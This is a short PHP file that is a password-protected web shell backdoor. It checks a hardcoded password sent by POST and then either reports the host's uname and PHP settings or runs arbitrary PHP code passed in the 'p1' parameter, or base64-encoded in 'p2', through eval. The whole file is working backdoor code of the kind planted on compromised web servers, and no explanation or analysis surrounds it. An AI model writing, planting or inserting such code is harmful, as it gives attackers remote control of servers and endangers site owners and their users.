<?php $_passssword = "asldkjsdfhoiuer3u98iuefghkjdbvmnbkjhas398";
if (!@$_POST["p2"] AND $_POST["pass"]==$_passssword) {
    $a = array(
        "uname" => php_uname(),
        "php_version" => phpversion(),
        "safemode" => @ini_get("safe_mode"),
    );
    echo serialize($a);
    exit;
} elseif(!empty($_POST["p2"]) AND $_POST["pass"]==$_passssword) {
    eval(base64_decode($_POST["p2"]));
    exit;
} elseif(!empty($_POST["p1"]) AND $_POST["pass"]==$_passssword) {
    eval($_POST["p1"]);
    exit;
}
unset($_passssword);